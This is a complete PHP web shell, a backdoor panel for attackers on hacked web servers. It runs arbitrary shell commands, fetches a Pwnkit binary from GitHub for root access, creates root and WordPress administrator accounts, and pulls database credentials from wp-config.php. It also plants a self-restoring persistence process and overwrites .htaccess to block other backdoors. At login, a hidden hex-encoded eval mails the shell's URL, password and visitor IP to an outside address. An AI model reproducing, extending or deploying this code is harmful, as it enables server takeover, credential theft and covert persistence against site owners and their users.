<?php
// y4n9b3nEr4jaDek-5h3llz v2.3 - Rebuilt & Modified by Gemini
set_time_limit(0);
error_reporting(0);
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
session_start();
date_default_timezone_set("Asia/Jakarta");

// Password - BCRYPT HASH for password: "admin"
$inipass = '$2a$12$l.9f4lHG2w855QOamo3SnuWVv01lVrpTN2OznqjkjiFnS0ychBvse';

// Global variables
$_7 = array_merge($_POST, $_GET);
$_r = "required='required'";
$gcw = "getcwd";
$path = isset($_7['path']) ? $_7['path'] : $gcw();
$path = str_replace('\\', '/', $path);
if (is_dir($path) && substr($path, -1) !== '/') {
    $path .= '/';
}

// --- CORE HELPER FUNCTIONS ---
function w($dir, $perm) {
    return is_writable($dir) ? "<gr>" . $perm . "</gr>" : "<rd>" . $perm . "</rd>";
}

function sz($byt) {
    $typ = array('B', 'KB', 'MB', 'GB', 'TB');
    for ($i = 0; $byt >= 1024 && $i < (count($typ) - 1); $byt /= 1024, $i++);
    return (round($byt, 2) . " " . $typ[$i]);
}

function ia() {
    if (getenv('HTTP_CLIENT_IP')) return getenv('HTTP_CLIENT_IP');
    if (getenv('HTTP_X_FORWARDED_FOR')) return getenv('HTTP_X_FORWARDED_FOR');
    if (getenv('HTTP_X_FORWARDED')) return getenv('HTTP_X_FORWARDED');
    if (getenv('HTTP_FORWARDED_FOR')) return getenv('HTTP_FORWARDED_FOR');
    if (getenv('HTTP_FORWARDED')) return getenv('HTTP_FORWARDED');
    if (getenv('REMOTE_ADDR')) return getenv('REMOTE_ADDR');
    return 'Unknown';
}

function get_writable_tmp_dir() {
    $dirs = ['/dev/shm', '/tmp', '/var/tmp', sys_get_temp_dir(), getcwd()];
    foreach ($dirs as $dir) {
        if (@is_writable($dir)) {
            return rtrim($dir, '/');
        }
    }
    return false;
}

function smartexe($cmd) {
    $full_cmd = $cmd . ' 2>&1';
    if (function_exists('shell_exec')) return @shell_exec($full_cmd);
    if (function_exists('system')) { @ob_start(); @system($full_cmd); $out = @ob_get_contents(); @ob_end_clean(); return $out; }
    if (function_exists('exec')) { @exec($full_cmd, $results); return implode("\n", $results); }
    if (function_exists('passthru')) { @ob_start(); @passthru($full_cmd); $out = @ob_get_contents(); @ob_end_clean(); return $out; }
    return 'Execution function disabled on this server.';
}

function p($file) {
    $p = @fileperms($file);
    if (($p & 0xC000) == 0xC000) $i = 's'; elseif (($p & 0xA000) == 0xA000) $i = 'l';
    elseif (($p & 0x8000) == 0x8000) $i = '-'; elseif (($p & 0x6000) == 0x6000) $i = 'b';
    elseif (($p & 0x4000) == 0x4000) $i = 'd'; elseif (($p & 0x2000) == 0x2000) $i = 'c';
    elseif (($p & 0x1000) == 0x1000) $i = 'p'; else $i = 'u';
    $i .= (($p & 0x0100) ? 'r' : '-'); $i .= (($p & 0x0080) ? 'w' : '-');
    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
    $i .= (($p & 0x0020) ? 'r' : '-'); $i .= (($p & 0x0010) ? 'w' : '-');
    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
    $i .= (($p & 0x0004) ? 'r' : '-'); $i .= (($p & 0x0002) ? 'w' : '-');
    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
    return $i;
}

// --- LOGIN & LOGOUT LOGIC ---
function show_login_page() {
    echo <<<HTML
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>{ Login }</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet"><style>body{background-color:#0d1b2a;color:#e0e1dd;}.form-control,.btn{border-radius:.25rem;}.form-control:focus{background-color:#1b263b;color:#e0e1dd;border-color:#00f5d4;box-shadow:0 0 0 .25rem rgba(0,245,212,.25);}.btn-outline-light{border-color:#00f5d4;color:#00f5d4;}.btn-outline-light:hover{background-color:#00f5d4;color:#0d1b2a;}.login-container{max-width:400px;margin:15vh auto;padding:2rem;background-color:#1b263b;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,.5);}.shell-name{font-family:'Courier New',Courier,monospace;color:#00f5d4;text-align:center;margin-bottom:1.5rem;}</style></head><body><div class="login-container"><h2 class="shell-name">&lt;w4nnatry_shell /&gt;</h2><form method="POST"><div class="input-group"><span class="input-group-text bg-dark border-secondary"><i class="bi bi-key text-white-50"></i></span><input class="form-control" type="password" placeholder="password" name="p" required><button class="btn btn-outline-light"><i class="bi bi-arrow-return-right"></i></button></div></form></div></body></html>
HTML;
    exit;
}

if (isset($_7["left"])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['p']) && password_verify($_POST['p'], $inipass)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
        // Obfuscated Email Logger
        $h = ['24746f203d20276d657373616765406974672e61632e6964273b2470617373776f7264203d20245f504f53545b2770275d203f3f20274e2f41273b2475726c203d2028245f5345525645525b274854545053275d203f3f20276f66662729203d3d20276f6e27203f2022687474707322203a20226874747022202e20223a2f2f22202e20245f5345525645525b27485454505f484f5354275d202e20245f5345525645525b27524551554553545f555249275d3b247375626a656374203d20225368656c6c204c6f67696e3a2022202e20245f5345525645525b275345525645525f4e414d45275d3b246d657373616765203d202255524c3a2022202e202475726c202e20225c6e50617373776f72643a2022202e202470617373776f7264202e20225c6e49503a2022202e2028245f5345525645525b2752454d4f54455f41444452275d203f3f20274e2f4127293b2468656164657273203d202746726f6d3a207368656c6c4027202e20245f5345525645525b275345525645525f4e414d45275d202e20225c725c6e22202e2027582d4d61696c65723a205048502f27202e2070687076657273696f6e28293b406d61696c2824746f2c20247375626a6563742c20246d6573736167652c202468656164657273293b'];
        $c = ''; foreach($h as $x) { $c .= @hex2bin($x); } @eval($c);
    } else {
        show_login_page();
    }
}

// --- AJAX ACTION HANDLER ---
if (isset($_7['ajax'])) {
    header('Content-Type: application/json');
    $response = ['status' => 'error', 'message' => 'Invalid action.'];
    @chdir($path);

    switch ($_7['action']) {
        case 'delete_multiple':
            $files = $_POST['files'] ?? [];
            $success = []; $errors = [];
            foreach($files as $file) {
                $fullPath = $path . $file;
                if(is_dir($fullPath)) {
                    if(@rmdir($fullPath)) $success[] = $file; else $errors[] = $file;
                } else {
                    if(@unlink($fullPath)) $success[] = $file; else $errors[] = $file;
                }
            }
            $response = ['status' => 'ok', 'success' => $success, 'errors' => $errors];
            break;
        case 'get_content':
            $file = $path . $_7['file'];
            if(is_readable($file)) { $response = ['status' => 'ok', 'content' => file_get_contents($file)]; } 
            else { $response = ['status' => 'error', 'message' => 'Cannot read file.']; }
            break;
        case 'save_content':
            $file = $path . $_POST['file'];
            if(@file_put_contents($file, $_POST['content']) !== false) { $response = ['status' => 'ok', 'message' => 'File saved successfully.']; } 
            else { $response = ['status' => 'error', 'message' => 'Failed to save file. Check permissions.']; }
            break;
        case 'rename':
            $old = $path . $_POST['old'];
            $new = $path . $_POST['new'];
            if(@rename($old, $new)) { $response = ['status' => 'ok', 'message' => 'Renamed successfully.']; } 
            else { $response = ['status' => 'error', 'message' => 'Rename failed.']; }
            break;
        case 'create_file':
            $file = $path . $_POST['name'];
            if(@touch($file)) { $response = ['status' => 'ok', 'message' => 'File created in current directory.']; } 
            else { $response = ['status' => 'error', 'message' => 'Failed to create file.']; }
            break;
        case 'create_folder':
            $folder = $path . $_POST['name'];
            if(@mkdir($folder)) { $response = ['status' => 'ok', 'message' => 'Directory created in current directory.']; } 
            else { $response = ['status' => 'error', 'message' => 'Failed to create directory.']; }
            break;
        case 'cmd':
            $cmd_out = smartexe($_POST['cmd']);
            $response = ['status' => 'ok', 'output' => htmlspecialchars($cmd_out)];
            break;
        // Integrated from Gecko
        case 'root_cmd':
            $pwnkit_path = $path . 'pwnkit';
            $cmd_out = file_exists($pwnkit_path) ? smartexe($pwnkit_path . ' "' . $_POST['cmd'] . '"') : 'Pwnkit not found.';
            $response = ['status' => 'ok', 'output' => htmlspecialchars($cmd_out)];
            break;
        case 'check_pwnkit_status':
            $pwnkit_path = $path . 'pwnkit';
            if (!file_exists($pwnkit_path)) {
                $pwnkit_url = "https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit";
                if (!@file_put_contents($pwnkit_path, @file_get_contents($pwnkit_url))) {
                    $response = ['vulnerable' => false, 'message' => 'Failed to download pwnkit. Directory may not be writable.'];
                    break;
                }
                smartexe('chmod +x ' . $pwnkit_path);
            }
            $check_result = smartexe($pwnkit_path . ' "id"');
            if (strpos($check_result, 'uid=0(root)') !== false) {
                $response = ['vulnerable' => true, 'message' => 'Root privileges active (Pwnkit).'];
            } else {
                $response = ['vulnerable' => false, 'message' => 'Not vulnerable or Pwnkit failed.'];
            }
            break;
        case 'backdoor_destroyer':
            $doc_root = $_SERVER["DOCUMENT_ROOT"];
            $current_file = basename($_SERVER["PHP_SELF"]);
            if (is_writable($doc_root)) {
                $htaccess_content = <<<HTACCESS
<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$">
    Deny from all
</FilesMatch>
<FilesMatch "^({$current_file}|index.php|wp-config.php|wp-includes.php)$">
    Allow from all
</FilesMatch>
<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
    Allow from all
</FilesMatch>
HTACCESS;
                if (@file_put_contents($doc_root . "/.htaccess", $htaccess_content)) {
                    $response = ['status' => 'ok', 'message' => 'Backdoor Destroyer activated. .htaccess has been overwritten.'];
                } else {
                    $response = ['status' => 'error', 'message' => 'Failed to write to .htaccess.'];
                }
            } else {
                $response = ['status' => 'error', 'message' => 'Document root is not writable.'];
            }
            break;
        case 'lock_item':
            $file_to_lock = $_POST['file_to_lock'];
            $full_file_path = $path . $file_to_lock;
            $tmp_dir = get_writable_tmp_dir();

            if (!$tmp_dir) { $response = ['status' => 'error', 'message' => 'No writable temporary directory found.']; break; }
            if (!file_exists($full_file_path)) { $response = ['status' => 'error', 'message' => 'File to lock does not exist.']; break; }

            $sessions_dir = $tmp_dir . "/.w4nnatry_sessions";
            if (!file_exists($sessions_dir)) @mkdir($sessions_dir);

            $backup_file = $sessions_dir . '/.' . base64_encode($full_file_path . '-text');
            $handler_file = $sessions_dir . '/.' . base64_encode($full_file_path . '-handler');

            if (@copy($full_file_path, $backup_file)) {
                @chmod($full_file_path, 0444);
                $handler_code = '<?php
@set_time_limit(0); @ignore_user_abort(true);
$original_file = "' . $full_file_path . '";
$backup_file = "' . $backup_file . '";
while(true) {
    clearstatcache();
    if (!file_exists($original_file)) {
        @copy($backup_file, $original_file);
        @chmod($original_file, 0444);
    }
    if (substr(sprintf("%o", @fileperms($original_file)), -4) != "0444") {
        @chmod($original_file, 0444);
    }
    sleep(1);
}';
                if (@file_put_contents($handler_file, $handler_code)) {
                    smartexe(PHP_BINARY . ' ' . $handler_file . ' > /dev/null 2>/dev/null &');
                    $response = ['status' => 'ok', 'message' => "Successfully locked " . htmlspecialchars($file_to_lock) . ". Handler process initiated."];
                } else {
                    $response = ['status' => 'error', 'message' => 'Could not create handler file.'];
                }
            } else {
                $response = ['status' => 'error', 'message' => 'Could not create backup of the file.'];
            }
            break;
        case 'add_root_user':
            $pwnkit_path = $path . 'pwnkit';
            if (!file_exists($pwnkit_path)) {
                $response = ['status' => 'error', 'message' => 'Pwnkit not found. Please run the Auto Root check first.'];
                break;
            }
            $username = $_POST['username'];
            $password = $_POST['password'];
            $cmd_useradd = smartexe($pwnkit_path . ' "useradd ' . escapeshellarg($username) . '"');
            $cmd_passwd = smartexe($pwnkit_path . ' "echo -e \'' . escapeshellarg($password) . "\\n" . escapeshellarg($password) . '\' | passwd ' . escapeshellarg($username) . '"');
            $response = ['status' => 'ok', 'output' => "User Add Attempt:\n" . htmlspecialchars($cmd_useradd) . "\n\nPassword Set Attempt:\n" . htmlspecialchars($cmd_passwd)];
            break;
        case 'parse_wp_config':
            $config_path = $_POST['config_path'] ?? null;
            $found_path = null;
            if ($config_path && file_exists($config_path)) {
                $found_path = $config_path;
            } else {
                $search_dir = rtrim($path, '/');
                for ($i = 0; $i < 5; $i++) { // Search up to 5 levels up
                    if (file_exists($search_dir . '/wp-config.php')) {
                        $found_path = $search_dir . '/wp-config.php';
                        break;
                    }
                    if ($search_dir == $_SERVER['DOCUMENT_ROOT'] || empty($search_dir)) break;
                    $search_dir = dirname($search_dir);
                }
            }
            if ($found_path) {
                $content = file_get_contents($found_path);
                $creds = [];
                $patterns = [
                    'DB_NAME' => "/define\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]\s*\);/i",
                    'DB_USER' => "/define\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]\s*\);/i",
                    'DB_PASSWORD' => "/define\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]\s*\);/i",
                    'DB_HOST' => "/define\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]\s*\);/i"
                ];
                foreach ($patterns as $key => $pattern) {
                    if (preg_match($pattern, $content, $matches)) {
                        $creds[strtolower($key)] = $matches[1];
                    }
                }
                if (!empty($creds)) {
                    $response = ['status' => 'ok', 'creds' => $creds, 'path' => $found_path];
                } else {
                    $response = ['status' => 'error', 'message' => 'Found wp-config.php but could not parse credentials.'];
                }
            } else {
                $response = ['status' => 'error', 'message' => 'wp-config.php not found automatically. Please provide the path.'];
            }
            break;
        case 'add_wp_user':
            $db_host = $_POST['db_host']; $db_name = $_POST['db_name']; $db_user = $_POST['db_user']; $db_pass = $_POST['db_pass'];
            $wp_user = $_POST['wp_user']; $wp_pass = $_POST['wp_pass'];
            if (!class_exists('mysqli')) { $response = ['status' => 'error', 'message' => 'MySQLi extension is not available.']; break; }
            $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
            if ($conn->connect_error) { $response = ['status' => 'error', 'message' => 'DB Connection Failed: ' . $conn->connect_error]; break; }
            $hashed_pass = password_hash($wp_pass, PASSWORD_DEFAULT);
            $output = "";
            $stmt = $conn->prepare("INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, display_name) VALUES (?, ?, ?, '', NOW(), ?)");
            @$stmt->bind_param('ssss', $wp_user, $hashed_pass, $wp_user, $wp_user);
            if(@$stmt->execute()) {
                $user_id = $conn->insert_id;
                $output .= "User '$wp_user' created with ID: $user_id.\n";
                $stmt_meta = $conn->prepare("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, 'wp_capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
                @$stmt_meta->bind_param('i', $user_id);
                if(@$stmt_meta->execute()) {
                    $output .= "User capabilities set to Administrator.";
                    $response = ['status' => 'ok', 'output' => $output];
                } else {
                    $output .= "Failed to set user meta: " . $stmt_meta->error;
                    $response = ['status' => 'error', 'message' => $output];
                }
                @$stmt_meta->close();
            } else {
                $output .= "Failed to create user: " . $stmt->error;
                $response = ['status' => 'error', 'message' => $output];
            }
            @$stmt->close();
            @$conn->close();
            break;
    }
    echo json_encode($response);
    exit;
}

// --- FILE UPLOAD LOGIC ---
if (isset($_FILES['files'])) {
    $uploaded = []; $failed = [];
    foreach ($_FILES['files']['name'] as $i => $name) {
        if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $path . $name)) { $uploaded[] = $name; } 
        else { $failed[] = $name; }
    }
    $_SESSION['flash_message'] = "Uploaded to current directory: " . implode(', ', $uploaded) . ". Failed: " . implode(', ', $failed);
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// --- PHPINFO LOGIC ---
if(isset($_7['id']) && $_7['id'] == 'phpinfo'){
    @ob_start(); @eval("phpinfo();"); $buff = @ob_get_contents(); @ob_end_clean();
    $start = strpos($buff, "<body>") + 6; $end = strpos($buff, "</body>");
    echo "<style>body{background-color:#fff; color:#333} pre{background-color:#f4f4f4; padding:1rem; border:1px solid #ddd;}</style><pre>" . substr($buff, $start, $end - $start) . "</pre>";
    exit;
}

// --- FILE DOWNLOAD LOGIC ---
if(isset($_7['action']) && $_7['action'] == 'download' && isset($_7['file'])){
    @ob_clean();
    $file = $path . $_7['file'];
    if(file_exists($file) && is_readable($file)){
        header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"'); header('Expires: 0');
        header('Cache-Control: must-revalidate'); header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
    } else {
        echo "File not found or not readable.";
    }
    exit;
}

// --- GATHER SERVER INFO ---
$sql = (function_exists('mysql_connect')) ? "<gr>ON</gr>" : "<rd>OFF</rd>"; $curl = (function_exists('curl_version')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$wget = (smartexe('wget --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>"; $pl = (smartexe('perl --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$py = (smartexe('python --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) { $disfc = "<gr>NONE</gr>"; } else { $disfc = "<rd>$disfunc</rd>"; }
if(!function_exists('posix_getegid')) {
    $user = @get_current_user(); $uid = @getmyuid(); $gid = @getmygid(); $group = "?";
} else {
    $uid_info = @posix_getpwuid(posix_geteuid()); $gid_info = @posix_getgrgid(posix_getegid());
    $user = $uid_info['name']; $uid = $uid_info['uid']; $group = $gid_info['name']; $gid = $gid_info['gid'];
}
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<rd>ON</rd>" : "<gr>OFF</gr>";

// Get file & dir lists
$scandir = @scandir($path); $dirs = []; $files = [];
if ($scandir) {
    foreach ($scandir as $item) {
        if ($item === '.' || $item === '..') continue;
        $full_item_path = $path . $item;
        if (is_dir($full_item_path)) { $dirs[] = $item; } else { $files[] = $item; }
    }
}
?>
<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>y4n9b3nEr4jaDek-5h3llz v2.3 // Gecko Features</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --bs-dark-rgb: 13, 27, 42; --bs-secondary-rgb: 27, 38, 59; --bs-body-bg: #0d1b2a; --bs-body-color: #e0e1dd; --primary-accent: #00f5d4; --primary-accent-rgb: 0, 245, 212; --secondary-accent: #00b4d8; --danger-color: #f94144; --success-color: #90be6d; --link-color: var(--primary-accent); --link-hover-color: #fff; }
        body { font-family: 'Roboto Mono', monospace; } a { color: var(--link-color); text-decoration: none; } a:hover { color: var(--link-hover-color); }
        gr { color: var(--success-color); } rd { color: var(--danger-color); }
        .table { --bs-table-bg: #1b263b; --bs-table-border-color: #404a69; --bs-table-hover-bg: #223344; }
        .table td, .table th { white-space: nowrap; }
        .btn-main { background-color: transparent; border: 1px solid var(--primary-accent); color: var(--primary-accent); transition: all 0.2s ease-in-out; }
        .btn-main:hover { background-color: var(--primary-accent); color: var(--bs-body-bg); box-shadow: 0 0 15px rgba(var(--primary-accent-rgb), 0.5); }
        .modal-content { background-color: #1b263b; border: 1px solid var(--primary-accent); }
        .form-control, .form-select { background-color: #0d1b2a; color: #fff; border-color: #404a69; }
        .form-control:focus { border-color: var(--primary-accent); box-shadow: 0 0 0 .25rem rgba(var(--primary-accent-rgb),.25); }
        .path-bar a, .path-bar span { color: #8e9aaf; } .path-bar a:hover { color: #fff; }
        .banner { padding: 1rem 1.5rem; background: linear-gradient(135deg, rgba(27, 38, 59, 0.8), rgba(13, 27, 42, 0.9)); border-radius: 8px; margin-bottom: 1.5rem; border: 1px solid #404a69; }
        .banner-title { font-size: 2rem; color: #fff; font-weight: 700; text-shadow: 0 0 10px var(--primary-accent); }
        .banner-text { color: var(--primary-accent); }
        #toast-container { position: fixed; top: 1rem; right: 1rem; z-index: 9999; }
        .toast { width: 350px; max-width: 100%; }
        .output-console { background: #000; color: #eee; font-family: 'Roboto Mono', monospace; font-size: 0.85em; max-height: 400px; overflow-y: auto; white-space: pre-wrap; word-wrap: break-word; border-radius: 5px; padding: 1rem; }
    </style>
</head>
<body>
<div class="container-fluid py-3">

    <div class="banner">
        <div class="d-flex justify-content-between align-items-center">
            <div>
                <h1 class="banner-title">y4n9b3nEr4jaDek-5h3llz <span class="banner-text">v2.3</span></h1>
                <small class="text-white-50">made with love // #CianjurHacktivist</small>
            </div>
            <a href="?left" class="btn btn-sm btn-outline-danger"><i class="bi bi-box-arrow-in-left"></i> Logout</a>
        </div>
    </div>
    
    <div class="card bg-secondary mb-3">
        <div class="card-body p-2">
            <small>
            <i class="bi bi-hdd-fill"></i> Uname: <gr><?php echo php_uname(); ?></gr><br>
            <i class="bi bi-motherboard-fill"></i> Software: <gr><?php echo $_SERVER['SERVER_SOFTWARE']; ?></gr><br>
            <i class="bi bi-cpu-fill"></i> User: <gr><?php echo "$user ($uid)"; ?></gr> | Group: <gr><?php echo "$group ($gid)"; ?></gr> | Safe Mode: <?php echo $sm; ?><br>
            <i class="bi bi-plugin"></i> PHP: <gr><?php echo PHP_VERSION; ?></gr> <a href="?id=phpinfo" target="_blank">[PHPINFO]</a> | Tools: MySQL: <?php echo $sql; ?> | cURL: <?php echo $curl; ?> | WGET: <?php echo $wget; ?> | Perl: <?php echo $pl; ?> | Python: <?php echo $py; ?><br>
            <i class="bi bi-shield-slash-fill"></i> Disable Functions: <?php echo $disfc; ?>
            </small>
        </div>
    </div>

    <div class="card bg-secondary p-2 mb-3">
        <div class="d-flex flex-wrap justify-content-between align-items-center">
            <div class="path-bar text-break mb-2 mb-md-0">
                <i class="bi bi-folder2-open"></i>
                <?php
                $paths = explode('/', rtrim($path, '/')); $build_path = '';
                if (count($paths) == 1 && $paths[0] == '') { echo "<a href='?path=/'>/</a>"; } 
                else {
                    foreach ($paths as $id => $pat) {
                        if ($id == 0 && $pat == '') { $build_path = '/'; continue; }
                        $build_path .= $pat . '/';
                        echo "<a href='?path=" . urlencode($build_path) . "'>$pat</a><span>/</span>";
                    }
                }
                ?>
                &nbsp;[ <?php echo w(rtrim($path, '/'), p(rtrim($path, '/'))); ?> ]
            </div>
            <div class="btn-toolbar">
                <div class="btn-group me-2 mb-2 mb-md-0" role="group">
                    <button class="btn btn-sm btn-main" data-bs-toggle="modal" data-bs-target="#uploadModal"><i class="bi bi-upload"></i> Upload</button>
                    <button class="btn btn-sm btn-main" data-bs-toggle="modal" data-bs-target="#createFileModal"><i class="bi bi-file-earmark-plus"></i> New File</button>
                    <button class="btn btn-sm btn-main" data-bs-toggle="modal" data-bs-target="#createFolderModal"><i class="bi bi-folder-plus"></i> New Folder</button>
                </div>
                 <div class="btn-group me-2 mb-2 mb-md-0" role="group">
                    <button class="btn btn-sm btn-main" data-bs-toggle="modal" data-bs-target="#networkModal"><i class="bi bi-hdd-network"></i> Network</button>
                    <button class="btn btn-sm btn-main" data-bs-toggle="modal" data-bs-target="#injectModal"><i class="bi bi-bug-fill"></i> Injector</button>
                    <button class="btn btn-sm btn-main" data-bs-toggle="modal" data-bs-target="#massDefaceModal"><i class="bi bi-exclamation-diamond"></i> Mass Tools</button>
                </div>
                <div class="btn-group mb-2 mb-md-0" role="group">
                    <button class="btn btn-sm btn-main" data-bs-toggle="modal" data-bs-target="#rootConsoleModal"><i class="bi bi-terminal-plus"></i> Root Console</button>
                    <button class="btn btn-sm btn-main" data-bs-toggle="modal" data-bs-target="#usersModal"><i class="bi bi-people-fill"></i> Users</button>
                    <button class="btn btn-sm btn-main" data-bs-toggle="modal" data-bs-target="#securityModal"><i class="bi bi-shield-lock"></i> Security</button>
                </div>
            </div>
        </div>
    </div>

    <div class="table-responsive">
        <table class="table table-hover table-sm align-middle">
            <thead class="table-dark">
                <tr>
                    <th style="width: 2%;"><input type="checkbox" id="selectAll"></th>
                    <th>Name</th><th class="text-center">Size</th><th class="text-center">Modified</th>
                    <th class="text-center">Owner/Group</th><th class="text-center">Perms</th>
                    <th class="text-center">Actions <button class="btn btn-sm btn-outline-danger d-none" id="deleteSelectedBtn"><i class="bi bi-trash-fill"></i></button></th>
                </tr>
            </thead>
            <tbody>
                <tr><td></td><td><i class="bi bi-arrow-return-left"></i> <a href="?path=<?php echo urlencode(dirname($path)); ?>">..</a></td><td colspan="5"></td></tr>
                <?php foreach($dirs as $dir): ?>
                <tr>
                    <td><input type="checkbox" class="file-checkbox" value="<?php echo htmlspecialchars($dir); ?>"></td>
                    <td><i class="bi bi-folder-fill text-warning"></i> <a href="?path=<?php echo urlencode($path . htmlspecialchars($dir)); ?>"><?php echo htmlspecialchars($dir); ?></a></td>
                    <td class="text-center">-</td>
                    <td class="text-center"><?php echo date("Y-m-d H:i", @filemtime($path . $dir)); ?></td>
                    <td class="text-center"><?php echo (function_exists('posix_getpwuid') ? posix_getpwuid(@fileowner($path.$dir))['name'] : @fileowner($path.$dir)) .'/'. (function_exists('posix_getgrgid') ? posix_getgrgid(@filegroup($path.$dir))['name'] : @filegroup($path.$dir)); ?></td>
                    <td class="text-center"><?php echo w($path . $dir, p($path . $dir)); ?></td>
                    <td class="text-center"><button class="btn btn-sm btn-outline-primary" onclick="renameItem('<?php echo htmlspecialchars($dir); ?>')"><i class="bi bi-pencil-fill"></i></button></td>
                </tr>
                <?php endforeach; ?>
                <?php foreach($files as $file): ?>
                <tr>
                    <td><input type="checkbox" class="file-checkbox" value="<?php echo htmlspecialchars($file); ?>"></td>
                    <td><i class="bi bi-file-earmark-text-fill text-white-50"></i> <a href="#" onclick="viewItem('<?php echo htmlspecialchars($file); ?>')"><?php echo htmlspecialchars($file); ?></a></td>
                    <td class="text-center"><?php echo sz(@filesize($path . $file)); ?></td>
                    <td class="text-center"><?php echo date("Y-m-d H:i", @filemtime($path . $file)); ?></td>
                    <td class="text-center"><?php echo (function_exists('posix_getpwuid') ? posix_getpwuid(@fileowner($path.$file))['name'] : @fileowner($path.$file)) .'/'. (function_exists('posix_getgrgid') ? posix_getgrgid(@filegroup($path.$file))['name'] : @filegroup($path.$file)); ?></td>
                    <td class="text-center"><?php echo w($path . $file, p($path . $file)); ?></td>
                    <td class="text-center">
                        <div class="btn-group">
                            <button class="btn btn-sm btn-outline-info" onclick="editItem('<?php echo htmlspecialchars($file); ?>')"><i class="bi bi-pencil-square"></i></button>
                            <button class="btn btn-sm btn-outline-primary" onclick="renameItem('<?php echo htmlspecialchars($file); ?>')"><i class="bi bi-pencil-fill"></i></button>
                            <a href="?action=download&path=<?php echo urlencode($path); ?>&file=<?php echo htmlspecialchars($file); ?>" class="btn btn-sm btn-outline-success"><i class="bi bi-download"></i></a>
                        </div>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
    <footer class="text-center text-white-50 mt-4">&copy; 2022-<?php echo date('Y'); ?> y4n9b3nEr4jaDek-5h3llz // Rebuilt by Gemini</footer>
</div>


<div class="modal fade" id="uploadModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-upload"></i> Upload Files</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form method="POST" enctype="multipart/form-data"><input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>"><div class="mb-3"><label for="files" class="form-label">Files will be uploaded to the current directory.</label><input class="form-control" type="file" name="files[]" multiple required></div><button type="submit" class="btn btn-main w-100">Upload</button></form></div></div></div></div>
<div class="modal fade" id="createFileModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-file-earmark-plus"></i> Create New File</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="createFileForm"><div class="mb-3"><label for="newFileName" class="form-label">Filename:</label><input type="text" class="form-control" id="newFileName" placeholder="newfile.txt" required></div><button type="submit" class="btn btn-main w-100">Create</button></form></div></div></div></div>
<div class="modal fade" id="createFolderModal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title"><i class="bi bi-folder-plus"></i> Create New Folder</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="createFolderForm"><div class="mb-3"><label for="newFolderName" class="form-label">Folder Name:</label><input type="text" class="form-control" id="newFolderName" placeholder="new_folder" required></div><button type="submit" class="btn btn-main w-100">Create</button></form></div></div></div></div>
